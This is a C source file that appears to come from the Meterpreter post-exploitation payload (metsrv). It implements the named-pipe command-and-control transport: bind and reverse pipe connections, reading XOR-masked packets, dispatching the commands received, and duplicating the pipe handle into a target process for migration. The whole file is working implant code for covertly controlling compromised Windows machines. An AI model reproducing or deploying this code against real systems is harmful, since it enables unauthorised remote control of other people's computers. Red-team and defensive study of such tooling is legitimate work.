/*!
 * @file server_transport_named_pipe.c
 */
#include "metsrv.h"
#include "packet_encryption.h"

// From server_pivot_named_pipe.c
VOID create_pipe_security_attributes(PSECURITY_ATTRIBUTES psa);
DWORD toggle_privilege(LPCWSTR privName, BOOL enable, BOOL* wasEnabled);

#define STUPID_PIPE_BUFFER_LIMIT 0x10000


typedef struct _PIPEMIGRATECONTEXT
{
	COMMONMIGRATECONTEXT common;

	// We force 64bit algnment for HANDLES and POINTERS in order
	// to be cross compatable between x86 and x64 migration.
	union
	{
		HANDLE pipe_handle;
		BYTE padding[8];
	} h;

} PIPEMIGRATECONTEXT, * LPPIPEMIGRATECONTEXT;

/*!
 * @brief Poll a named pipe for data to recv and block when none available.
 * @param remote Pointer to the remote instance.
 * @param timeout Amount of time to wait before the poll times out (in milliseconds).
 * @return Indication of success or failure.
 */
static DWORD server_pipe_poll(Remote* remote, long timeout)
{
	DWORD bytesAvailable = 0;
	NamedPipeTransportContext* ctx = (NamedPipeTransportContext*)remote->transport->ctx;

	lock_acquire(remote->lock);

	vdprintf("[NP DISPATCH] testing for data on the pipe, making sure there's enough for a packet header");
	BOOL ready = PeekNamedPipe(ctx->pipe, NULL, 0, NULL, &bytesAvailable, NULL) && bytesAvailable >= sizeof(PacketHeader);
	DWORD result = GetLastError();

	lock_release(remote->lock);

	if (ready)
	{
		vdprintf("[NP DISPATCH] pipe data found %u bytes", bytesAvailable);
		result = ERROR_SUCCESS;
	}
	else
	{
		if (result != ERROR_BROKEN_PIPE)
		{
			// simulate a wait so that we don't bash the crap out of the CPU?
			vdprintf("[NP DISPATCH] pipe data not found, sleeping (error %u)", GetLastError());
			Sleep(timeout);
			result = ERROR_NO_DATA;
		}
	}

	return result;
}

DWORD read_raw_bytes_to_buffer(NamedPipeTransportContext* ctx, LPBYTE buffer, DWORD bytesToRead, LPDWORD bytesRead)
{
	DWORD bytesReadThisIteration = 0;
	DWORD temp = 0;
	DWORD result = ERROR_SUCCESS;
	*bytesRead = 0;

	dprintf("[PIPE] Beginning read loop for a total of %u", bytesToRead);
	while (*bytesRead < bytesToRead)
	{
		dprintf("[PIPE] Trying to read %u (0x%x) bytes", min(STUPID_PIPE_BUFFER_LIMIT, bytesToRead - *bytesRead), min(STUPID_PIPE_BUFFER_LIMIT, bytesToRead - *bytesRead));
		// read the bytes fromi there.
		if (!ReadFile(ctx->pipe, buffer + *bytesRead, min(STUPID_PIPE_BUFFER_LIMIT, bytesToRead - *bytesRead), &bytesReadThisIteration, NULL))
		{
			result = GetLastError();
			dprintf("[PIPE] ReadFile returned error %u 0x%x", result, result);
			break;
		}

		dprintf("[PIPE] ReadFile claims to have read %u (0x%x) bytes", bytesReadThisIteration, bytesReadThisIteration);

		*bytesRead += bytesReadThisIteration;
	}

	dprintf("[PIPE] Done reading bytes");
	return result;
}

/*!
 * @brief Receive a new packet on the given remote endpoint.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
 * @return An indication of the result of processing the transmission request.
 */
static DWORD packet_receive_named_pipe(Remote *remote, Packet **packet)
{
	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
	PacketHeader header = { 0 };
	DWORD bytesRead;
	BOOL inHeader = TRUE;
	PUCHAR packetBuffer = NULL;
	PUCHAR payload = NULL;
	ULONG payloadLength;
	NamedPipeTransportContext* ctx = (NamedPipeTransportContext*)remote->transport->ctx;

	lock_acquire(remote->lock);

	dprintf("[PIPE PACKET RECEIVE] reading in the header from pipe handle: %p", ctx->pipe);
	// Read the packet length
	while (inHeader)
	{
		if (!ReadFile(ctx->pipe, ((PUCHAR)&header + headerBytes), sizeof(PacketHeader)-headerBytes, &bytesRead, NULL))
		{
			SetLastError(ERROR_NOT_FOUND);
			goto out;
		}

		headerBytes += bytesRead;

		if (headerBytes != sizeof(PacketHeader))
		{
			vdprintf("[PIPE] More bytes required");
			continue;
		}

		inHeader = FALSE;
	}

	if (headerBytes != sizeof(PacketHeader))
	{
		dprintf("[PIPE] we didn't get enough header bytes");
		goto out;
	}

	vdprintf("[PIPE] the XOR key is: %02x%02x%02x%02x", header.xor_key[0], header.xor_key[1], header.xor_key[2], header.xor_key[3]);

#ifdef DEBUGTRACE
	PUCHAR h = (PUCHAR)&header;
	dprintf("[PIPE] Packet header: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]",
		h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
#endif

	// At this point, we might have read in a valid TLV packet, or we might have read in the first chunk of data
	// from a staged listener after a reconnect. We can figure this out rather lazily by assuming the following:
	// XOR keys are always 4 bytes that are non-zero. If the higher order byte of the xor key is zero, then it
	// isn't an XOR Key, instead it's the 4-byte length of the metsrv binary (because metsrv isn't THAT big).
	if (header.xor_key[3] == 0)
	{
		// looks like we have a metsrv instance, time to ignore it.
		int length = *(int*)&header.xor_key[0];
		dprintf("[PIPE] discovered a length header, assuming it's metsrv of length %d", length);

		int bytesToRead = length - sizeof(PacketHeader) + sizeof(DWORD);
		BYTE* buffer = (BYTE*)malloc(bytesToRead);
		read_raw_bytes_to_buffer(ctx, buffer, bytesToRead, &bytesRead);
		free(buffer);

		// did something go wrong.
		if (bytesToRead != bytesRead)
		{
			dprintf("[PIPE] Failed to read all bytes when flushing the buffer: %u vs %u", bytesToRead, bytesRead);
			goto out;
		}

		// indicate success, but don't return a packet for processing
		SetLastError(ERROR_SUCCESS);
		*packet = NULL;
	}
	else
	{
		vdprintf("[PIPE] XOR key looks fine, moving on");
		// xor the header data
		xor_bytes(header.xor_key, (PUCHAR)&header + sizeof(header.xor_key), sizeof(PacketHeader) - sizeof(header.xor_key));
#ifdef DEBUGTRACE
		PUCHAR h = (PUCHAR)&header;
		dprintf("[PIPE] Packet header: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]",
			h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
#endif

		// if we don't have a GUID yet, we need to take the one given in the packet
		if (is_null_guid(remote->orig_config->session.session_guid))
		{
			memcpy(remote->orig_config->session.session_guid, header.session_guid, sizeof(remote->orig_config->session.session_guid));
		}

		payloadLength = ntohl(header.length) - sizeof(TlvHeader);
		dprintf("[PIPE] Payload length is %u 0x%08x", payloadLength, payloadLength);
		DWORD packetSize = sizeof(PacketHeader) + payloadLength;
		dprintf("[PIPE] total buffer size for the packet is %u 0x%08x", packetSize, packetSize);
		payloadBytesLeft = payloadLength;

		// Allocate the payload
		if (!(packetBuffer = (PUCHAR)malloc(packetSize)))
		{
			dprintf("[PIPE] Failed to create the packet buffer");
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			goto out;
		}
		dprintf("[PIPE] Allocated packet buffer at %p", packetBuffer);

		// we're done with the header data, so we need to re-encode it, as the packet decryptor is going to
		// handle the extraction for us.
		xor_bytes(header.xor_key, (LPBYTE)&header.session_guid[0], sizeof(PacketHeader) - sizeof(header.xor_key));
		// Copy the packet header stuff over to the packet
		memcpy_s(packetBuffer, sizeof(PacketHeader), (LPBYTE)&header, sizeof(PacketHeader));

		payload = packetBuffer + sizeof(PacketHeader);

		// Read the payload
		res = read_raw_bytes_to_buffer(ctx, payload, payloadLength, &bytesRead);
		dprintf("[PIPE] wanted %u read %u", payloadLength, bytesRead);

		// Didn't finish?
		if (bytesRead != payloadLength)
		{
			dprintf("[PIPE] Failed to get all the payload bytes");
			SetLastError(res);
			goto out;
		}

		vdprintf("[PIPE] decrypting packet");
		SetLastError(decrypt_packet(remote, packet, packetBuffer, packetSize));

		free(packetBuffer);
		packetBuffer = NULL;
	}
out:
	res = GetLastError();

	// Cleanup
	if (packetBuffer)
	{
		free(packetBuffer);
	}

	lock_release(remote->lock);

	return res;
}

/*!
 * @brief The servers main NP DISPATCH loop for incoming requests using SSL over named pipes.
 * @param remote Pointer to the remote endpoint for this server connection.
 * @param dispatchThread Pointer to the main NP DISPATCH thread.
 * @returns Indication of success or failure.
 */
static DWORD server_dispatch_named_pipe(Remote* remote, THREAD* dispatchThread)
{
	Transport* transport = remote->transport;
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet * packet = NULL;
	THREAD * cpt = NULL;

	dprintf("[NP DISPATCH] entering server_dispatch( 0x%08X )", remote);

	int lastPacket = current_unix_timestamp();
	while (running)
	{
		if (event_poll(dispatchThread->sigterm, 0))
		{
			dprintf("[NP DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}

		result = server_pipe_poll(remote, 500);
		if (result == ERROR_SUCCESS)
		{
			result = packet_receive_named_pipe(remote, &packet);
			if (result != ERROR_SUCCESS)
			{
				dprintf("[NP DISPATCH] packet_receive returned %d, exiting dispatcher...", result);
				break;
			}

			if (packet)
			{
				running = command_handle(remote, packet);
				dprintf("[NP DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
			}
			else
			{
				dprintf("[NP DISPATCH] Received NULL packet, could be metsrv being ignored");
			}

			// packet received, reset the timer
			lastPacket = current_unix_timestamp();
		}
		else if (result != ERROR_BROKEN_PIPE)
		{
			// check if the communication has timed out, or the session has expired, so we should terminate the session
			int now = current_unix_timestamp();
			if (remote->sess_expiry_end && now > remote->sess_expiry_end)
			{
				result = ERROR_SUCCESS;
				dprintf("[NP DISPATCH] session has ended");
				break;
			}
			else if ((now - lastPacket) > transport->timeouts.comms)
			{
				result = ERROR_NETWORK_NOT_AVAILABLE;
				dprintf("[NP DISPATCH] communications has timed out");
				break;
			}
		}
		else
		{
			dprintf("[NP DISPATCH] server_pipe_poll returned %d, exiting dispatcher...", result);
			break;
		}
	}

	dprintf("[NP DISPATCH] leaving server_dispatch.");

	return result;
}

/*!
 * @brief Destroy the named pipe transport.
 * @param transport Pointer to the transport to destroy.
 */
static void transport_destroy_named_pipe(Transport* transport)
{
	if (transport && transport->type == METERPRETER_TRANSPORT_PIPE)
	{
		dprintf("[TRANS PIPE] Destroying pipe transport for url %S", transport->url);
		SAFE_FREE(transport->url);
		if (transport->ctx)
		{
			SAFE_FREE(((NamedPipeTransportContext*)transport->ctx)->pipe_name);
		}
		SAFE_FREE(transport->ctx);
		SAFE_FREE(transport);
	}
}

/*!
 * @brief Reset the given named pipe connection.
 * @param transport Pointer to the named pipe transport to reset.
 * @param shuttingDown Indication that the Metsrv instance is terminating completely.
 */
static void transport_reset_named_pipe(Transport* transport, BOOL shuttingDown)
{
	if (transport && transport->type == METERPRETER_TRANSPORT_PIPE)
	{
		NamedPipeTransportContext* ctx = (NamedPipeTransportContext*)transport->ctx;
		dprintf("[NP] Resetting transport from 0x%x", ctx->pipe);

		if (ctx->pipe && ctx->pipe != INVALID_HANDLE_VALUE)
		{
			dprintf("[NP] Closing the handle");
			if (!CloseHandle(ctx->pipe))
			{
				dprintf("[NP] Handle close failed: %u", GetLastError());
			}
			else
			{
				dprintf("[NP] Handle closed");
			}
		}

		ctx->pipe = NULL;
		dprintf("[NP] Transport 0x%p is now reset to 0x%x", transport, ctx->pipe);
	}
}

/*!
 * @brief Configure reverse named pipe connnection.
 * @param pipe_name to connect to
 * @param timeouts
 * @return handle to connected pipe or INVALID_HANDLE_VALUE on error
 */
static HANDLE reverse_named_pipe(wchar_t *pipe_name, TimeoutSettings *timeouts)
{
	DWORD result = ERROR_SUCCESS;
	HANDLE hPipe = INVALID_HANDLE_VALUE;
	int start = current_unix_timestamp();
	do
	{
		dprintf("[NP CONFIGURE] pipe name is %S, attempting to create", pipe_name);
		hPipe = CreateFileW(pipe_name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hPipe != INVALID_HANDLE_VALUE)
		{
			break;
		}

		hPipe = INVALID_HANDLE_VALUE;
		result = GetLastError();
		dprintf("[NP CONFIGURE] failed to create pipe: %u 0x%x", result, result);
		dprintf("[NP CONFIGURE] Connection failed, sleeping for %u s", timeouts->retry_wait);
		sleep(timeouts->retry_wait);

	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < timeouts->retry_total);
	return hPipe;
}

/*!
 * @brief Configure bind named pipe connnection.
 * @param pipe_name to create
 * @param timeouts
 * @return handle to connected pipe or INVALID_HANDLE_VALUE on error
 */
static HANDLE bind_named_pipe(wchar_t *pipe_name, TimeoutSettings *timeouts)
{
	DWORD result = ERROR_SUCCESS;
	BOOL wasEnabled;
	HANDLE hPipe = INVALID_HANDLE_VALUE;
	DWORD toggleResult = toggle_privilege(SE_SECURITY_NAME, TRUE, &wasEnabled);
	if (toggleResult == ERROR_SUCCESS)
	{
		SECURITY_ATTRIBUTES sa = { 0 };
		create_pipe_security_attributes(&sa); // allow access anyone
		hPipe = CreateNamedPipeW(pipe_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES,
								 STUPID_PIPE_BUFFER_LIMIT, STUPID_PIPE_BUFFER_LIMIT, 0, &sa);
		result = GetLastError();
		if (wasEnabled == FALSE)
		{
			toggle_privilege(SE_SECURITY_NAME, FALSE, &wasEnabled);
		}
	}

	if (hPipe == INVALID_HANDLE_VALUE)
	{
		// Fallback on a pipe with simpler security attributes
		hPipe = CreateNamedPipeW(pipe_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES,
								 STUPID_PIPE_BUFFER_LIMIT, STUPID_PIPE_BUFFER_LIMIT, 0, NULL);
		result = GetLastError();
	}

	if (hPipe == INVALID_HANDLE_VALUE)
	{
		dprintf("[NP CONFIGURE] failed to create pipe: %u 0x%x", result, result);
		return INVALID_HANDLE_VALUE;
	}

	int start = current_unix_timestamp();
	do
	{
		if (ConnectNamedPipe(hPipe, NULL))
		{
			return hPipe;
		}

		result = GetLastError();
		if (result == ERROR_PIPE_CONNECTED)
		{
			return hPipe;
		}
		dprintf("[NP CONFIGURE] Failed to connect pipe: %u 0x%x", result, result);
		dprintf("[NP CONFIGURE] Trying again in %u s", 1);
		sleep(1);
	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < timeouts->retry_total);

	CloseHandle(hPipe);
	return INVALID_HANDLE_VALUE;
}


/*!
 * @brief Configure the named pipe connnection. If it doesn't exist, go ahead and estbalish it.
 * @param transport Pointer to the transport instance.
 * @return Indication of success or failure.
 */
static DWORD configure_named_pipe_connection(Transport* transport)
{
	DWORD result = ERROR_SUCCESS;
	wchar_t tempUrl[512];
	NamedPipeTransportContext* ctx = (NamedPipeTransportContext*)transport->ctx;

	if (ctx->pipe_name == NULL)
	{
		dprintf("[NP CONFIGURE] Url: %S", transport->url);
		wcscpy_s(tempUrl, 512, transport->url);
		dprintf("[NP CONFIGURE] Copied: %S", tempUrl);

		transport->comms_last_packet = current_unix_timestamp();

		dprintf("[NP CONFIGURE] Making sure it's a pipe ...");
		if (wcsncmp(tempUrl, L"pipe", 4) == 0)
		{
			dprintf("[NP CONFIGURE] Yup, it is, parsing");
			wchar_t* pServer = wcsstr(tempUrl, L"//") + 2;
			dprintf("[NP CONFIGURE] pServer is %p", pServer);
			dprintf("[NP CONFIGURE] pServer is %S", pServer);
			wchar_t* pName = wcschr(pServer, L'/') + 1;
			dprintf("[NP CONFIGURE] pName is %p", pName);
			dprintf("[NP CONFIGURE] pName is %S", pName);
			wchar_t* pSlash = wcschr(pName, L'/');
			dprintf("[NP CONFIGURE] pName is %p", pName);

			// Kill off a trailing slash if there is one
			if (pSlash != NULL)
			{
				*pSlash = '\0';
			}

			*(pName - 1) = '\0';

			dprintf("[NP CONFIGURE] Server: %S", pServer);
			dprintf("[NP CONFIGURE] Name: %S", pName);

			size_t requiredSize = wcslen(pServer) + wcslen(pName) + 9;
			ctx->pipe_name = (STRTYPE)calloc(requiredSize, sizeof(CHARTYPE));
			_snwprintf_s(ctx->pipe_name, requiredSize, requiredSize - 1, L"\\\\%s\\pipe\\%s", pServer, pName);
			dprintf("[NP CONFIGURE] Full pipe name: %S", ctx->pipe_name);
		}
	}


	// check if comms is already open via a staged payload
	if (ctx->pipe != NULL && ctx->pipe != INVALID_HANDLE_VALUE)
	{
		// Configure PIPE_WAIT. Stager doesn't do this because ConnectNamedPipe may never return.
		DWORD mode = 0;
		SetNamedPipeHandleState((HANDLE)ctx->pipe, &mode, NULL, NULL);
		dprintf("[NP] Connection already running on %u", ctx->pipe);
	}
	else
	{
		dprintf("[NP CONFIGURE] pipe name is %p", ctx->pipe_name);

		if (ctx->pipe_name != NULL)
		{
			if (wcsncmp(ctx->pipe_name, L"\\\\.\\", 4) == 0)
			{
				ctx->pipe = bind_named_pipe(ctx->pipe_name, &transport->timeouts);
			}
			else
			{
				ctx->pipe = reverse_named_pipe(ctx->pipe_name, &transport->timeouts);
			}
		}
		else
		{
			dprintf("[NP] we might have had an invalid URL");
			result = ERROR_INVALID_PARAMETER;
		}
	}

	if (ctx->pipe == INVALID_HANDLE_VALUE)
	{
		dprintf("[SERVER] Something went wrong");
		return ERROR_INVALID_PARAMETER;
	}

	dprintf("[SERVER] Looking good, FORWARD!");

	// Do not allow the file descriptor to be inherited by child processes
	SetHandleInformation((HANDLE)ctx->pipe, HANDLE_FLAG_INHERIT, 0);

	transport->comms_last_packet = current_unix_timestamp();

	return result;
}

/*!
 * @brief Transmit a packet via named pipe.
 * @param remote Pointer to the \c Remote instance.
 * @param rawPacket Pointer to the raw packet bytes to send.
 * @param rawPacketLength Length of the raw packet data.
 * @return An indication of the result of processing the transmission request.
 */
DWORD packet_transmit_named_pipe(Remote* remote, LPBYTE rawPacket, DWORD rawPacketLength)
{
	dprintf("[TRANSMIT PIPE] In packet_transmit_named_pipe");
	NamedPipeTransportContext* ctx = (NamedPipeTransportContext*)remote->transport->ctx;
	DWORD totalWritten = 0;
	DWORD written = 0;
	DWORD result = ERROR_SUCCESS;

	lock_acquire(ctx->write_lock);
	vdprintf("[TRANSMIT PIPE] Sending packet of %u bytes", rawPacketLength);

	while (totalWritten < rawPacketLength)
	{
		vdprintf("[TRANSMIT PIPE] Calling WriteFile");
		if (!WriteFile(ctx->pipe, rawPacket + totalWritten, rawPacketLength - totalWritten, &written, NULL))
		{
			vdprintf("[TRANSMIT PIPE] WriteFile failed: %u (%x)", GetLastError(), GetLastError());
			result = GetLastError();
			break;
		}
		dprintf("[TRANSMIT PIPE] WriteFile succeeded, wrote %u bytes", written);

		totalWritten += written;
	}

	if (result != ERROR_SUCCESS)
	{
		dprintf("[TRANSMIT PIPE] transmit packet failed with return %d at index %d", result, totalWritten);
	}
	else
	{
		vdprintf("[TRANSMIT PIPE] Packet sent!");
	}


	lock_release(ctx->write_lock);

	return result;
}

/*!
 * @brief Get the socket from the transport.
 * @param transport Pointer to the transport containing the socket.
 * @param handle The current transport handle, if any.
 */
static UINT_PTR transport_get_handle_named_pipe(Transport* transport)
{
	if (transport != NULL)
	{
		return (UINT_PTR)((NamedPipeTransportContext*)transport->ctx)->pipe;
	}

	return 0;
}

/*!
 * @brief Set the socket for the transport.
 * @param transport Pointer to the transport containing the socket.
 * @param handle The current transport socket FD, if any.
 */
static void transport_set_handle_named_pipe(Transport* transport, UINT_PTR handle)
{
	if (transport && transport->type == METERPRETER_TRANSPORT_PIPE)
	{
		((NamedPipeTransportContext*)transport->ctx)->pipe = (HANDLE)handle;
	}
}

/*!
 * @brief Create a configuration block from the given transport.
 * @param transport Transport data to create the configuration from.
 * @param config Pointer to the config block to write to.
 */
void transport_write_named_pipe_config(Transport* transport, MetsrvTransportNamedPipe* config)
{
	if (transport && config)
	{
		config->common.comms_timeout = transport->timeouts.comms;
		config->common.retry_total = transport->timeouts.retry_total;
		config->common.retry_wait = transport->timeouts.retry_wait;
		wcsncpy(config->common.url, transport->url, URL_SIZE);
	}
}

/*!
 * @brief Create a migration context that works for named pipe transports.
 * @param transport Pointer to the transport in question.
 * @param targetProcessId ID of the process we'll be migrating into.
 * @param targetProcessHandle Handle of the process we'll be migrating into.
 * @param contextSize Pointer to a buffer that receives the context size.
 * @param contextBuffer Pointer to a buffer that receives the context data.
 * @return Indication of success or failure.
 */
static DWORD get_migrate_context_named_pipe(Transport* transport, DWORD targetProcessId, HANDLE targetProcessHandle, LPDWORD contextSize, PBYTE* contextBuffer)
{
	LPPIPEMIGRATECONTEXT ctx = (LPPIPEMIGRATECONTEXT)calloc(1, sizeof(PIPEMIGRATECONTEXT));

	// Duplicate the handle for the pipe
	dprintf("[NP-MIGRATE] pipe handle: %p", ((NamedPipeTransportContext*)transport->ctx)->pipe);
	dprintf("[NP-MIGRATE] targetprocess handle: %p", targetProcessHandle);
	if (!DuplicateHandle(GetCurrentProcess(), ((NamedPipeTransportContext*)transport->ctx)->pipe, targetProcessHandle, &ctx->h.pipe_handle, 0, TRUE, DUPLICATE_SAME_ACCESS))
	{
		free(ctx);
		return GetLastError();
	}

	*contextSize = sizeof(PIPEMIGRATECONTEXT);
	*contextBuffer = (PBYTE)ctx;
	return ERROR_SUCCESS;
}

/*!
 * @brief Gets the size of the memory space required to store the configuration for this transport.
 * @param t Pointer to the transport.
 * @return Size, in bytes of the required memory block.
 */
static DWORD transport_get_config_size_named_pipe(Transport* t)
{
	return sizeof(MetsrvTransportNamedPipe);
}

/*!
 * @brief Creates a new named pipe transport instance.
 * @param config The Named Pipe configuration block.
 * @param size Pointer to the size of the parsed config block.
 * @return Pointer to the newly configured/created Named Pipe transport instance.
 */
Transport* transport_create_named_pipe(MetsrvTransportNamedPipe* config, LPDWORD size)
{
	Transport* transport = (Transport*)calloc(1, sizeof(Transport));
	NamedPipeTransportContext* ctx = (NamedPipeTransportContext*)calloc(1, sizeof(NamedPipeTransportContext));

	if (size)
	{
		*size = sizeof(MetsrvTransportNamedPipe);
	}

	// Lock used to synchronise writes
	ctx->write_lock = lock_create();

	dprintf("[TRANS NP] Creating pipe transport for url %S", config->common.url);

	transport->type = METERPRETER_TRANSPORT_PIPE;
	transport->timeouts.comms = config->common.comms_timeout;
	transport->timeouts.retry_total = config->common.retry_total;
	transport->timeouts.retry_wait = config->common.retry_wait;
	transport->url = _wcsdup(config->common.url);
	transport->packet_transmit = packet_transmit_named_pipe;
	transport->transport_init = configure_named_pipe_connection;
	transport->transport_destroy = transport_destroy_named_pipe;
	transport->transport_reset = transport_reset_named_pipe;
	transport->server_dispatch = server_dispatch_named_pipe;
	transport->get_handle = transport_get_handle_named_pipe;
	transport->set_handle = transport_set_handle_named_pipe;
	transport->ctx = ctx;
	transport->comms_last_packet = current_unix_timestamp();
	transport->get_migrate_context = get_migrate_context_named_pipe;
	transport->get_config_size = transport_get_config_size_named_pipe;

	return transport;
}
